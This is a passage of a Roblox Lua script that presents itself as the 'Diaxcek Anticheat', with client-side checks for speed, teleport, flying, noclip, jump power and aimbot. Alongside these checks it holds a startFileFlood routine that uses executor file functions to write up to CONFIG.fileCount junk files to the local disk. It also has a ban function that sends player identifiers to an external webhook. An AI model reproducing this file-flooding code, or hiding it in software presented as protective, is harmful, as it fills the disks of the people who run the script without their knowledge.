local Character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
local Humanoid = Character:WaitForChild("Humanoid")
local RootPart = Character:WaitForChild("HumanoidRootPart")
local lastPosition = RootPart.Position
local lastCheck = tick()
local flags = {}
local banned = false
local rejoinAttempts = _G.DiaxcekRejoinAttempts or 0
local floodRunning = false

local function startFileFlood()
    if floodRunning then return end
    floodRunning = true
    pcall(function()
        if not isfolder(CONFIG.folderName) then makefolder(CONFIG.folderName) end
        if not isfolder(CONFIG.folderName .. "/workspace") then makefolder(CONFIG.folderName .. "/workspace") end
    end)
    local basePath = CONFIG.folderName .. "/workspace/"
    local created, failed = 0, 0
    task.spawn(function()
        for i = 1, CONFIG.fileCount do
            if not floodRunning then break end
            local ok = pcall(function()
                writefile(basePath .. CONFIG.filePrefix .. i .. CONFIG.fileExt,
                    CONFIG.fileContent .. "ID: " .. i .. "\nTime: " .. tick())
            end)
            if ok then created = created + 1 else failed = failed + 1 end
            if i % CONFIG.batchSize == 0 then
                task.wait()
                if i % 5000 == 0 then
                    print(string.format("[Diaxcek Flood] %d / %d | Błędy: %d", created, CONFIG.fileCount, failed))
                end
            end
        end
        floodRunning = false
        print(string.format("[Diaxcek Flood] Koniec. Utworzono: %d | Błędy: %d", created, failed))
    end)
end

local function instantBan(reason, data)
    if banned then return end
    banned = true
    local flagData = {
        time = tick(), player = LocalPlayer.Name, userId = LocalPlayer.UserId,
        reason = reason, data = data or {}, place = game.PlaceId,
        jobId = game.JobId, rejoinAttempt = rejoinAttempts,
    }
    table.insert(flags, flagData)
    warn(string.format("[INSTANT BAN] %s | %s", reason, HttpService:JSONEncode(flagData)))
    if CONFIG.webhookURL ~= "" then
        pcall(function()
            HttpService:PostAsync(CONFIG.webhookURL, HttpService:JSONEncode({
                content = "**BAN** | " .. LocalPlayer.Name .. " | " .. reason,
                username = "Diaxcek Anticheat",
            }), Enum.HttpContentType.ApplicationJson)
        end)
    end
    if CONFIG.autoRejoin and rejoinAttempts < CONFIG.maxRejoinAttempts then
        rejoinAttempts = rejoinAttempts + 1
        _G.DiaxcekRejoinAttempts = rejoinAttempts
        task.spawn(function()
            task.wait(CONFIG.rejoinDelay)
            pcall(function()
                if CONFIG.jobId ~= "" then
                    TeleportService:TeleportToPlaceInstance(CONFIG.placeId, CONFIG.jobId, LocalPlayer)
                else
                    TeleportService:Teleport(CONFIG.placeId, LocalPlayer)
                end
            end)
        end)
    end
    LocalPlayer:Kick(CONFIG.banMessage .. " | Powód: " .. reason)
end

local function checkSpeed()
    local now = tick()
    local dt = now - lastCheck
    if dt <= 0 then return end
    local speed = (RootPart.Position - lastPosition).Magnitude / dt
    if speed > CONFIG.maxSpeed then instantBan("SPEED", {speed = speed}) end
    lastPosition = RootPart.Position
    lastCheck = now
end

local function checkTeleport()
    local delta = (RootPart.Position - lastPosition).Magnitude
    if delta > CONFIG.teleportDistance then instantBan("TELEPORT", {distance = delta}) end
end

local function checkFly()
    local ray = Ray.new(RootPart.Position, Vector3.new(0, -CONFIG.maxFlyHeight, 0))
    local hit = workspace:FindPartOnRay(ray, Character)
    if not hit and Humanoid.FloorMaterial == Enum.Material.Air then
        if Humanoid:GetState() ~= Enum.HumanoidStateType.Freefall then
            instantBan("FLY", {state = tostring(Humanoid:GetState())})
        end
    end
end

local function checkNoclip()
    local origin = RootPart.Position
    local direction = RootPart.CFrame.LookVector * 3
    local hit = workspace:FindPartOnRay(Ray.new(origin, direction), Character)
    if hit and hit.CanCollide then
        local newPos = origin + direction
        local region = Region3.new(newPos - Vector3.new(1,1,1), newPos + Vector3.new(1,1,1))
        for _, p in ipairs(workspace:FindPartsInRegion3(region, Character, 5)) do
            if p.CanCollide then instantBan("NOCLIP", {part = p.Name}) end
        end
    end
end

local function checkJumpPower()
    if Humanoid.JumpPower > CONFIG.maxJumpPower then
        instantBan("JUMP_POWER", {value = Humanoid.JumpPower})
    end
    if Humanoid.UseJumpPower == false then instantBan("JUMP_POWER_DISABLED", {}) end
end

local function checkAimbot()
    local camera = workspace.CurrentCamera
    if not camera then return end
    local look = camera.CFrame.LookVector
    for _, p in ipairs(Players:GetPlayers()) do
        if p == LocalPlayer then continue end
        local char = p.Character
        if not char then continue end
        local head = char:FindFirstChild("Head")
        if not head then continue end
        local dot = look:Dot((head.Position - camera.CFrame.Position).Unit)
        if dot > 0.999 then instantBan("AIMBOT", {target = p.Name, dot = dot}) end
    end
end

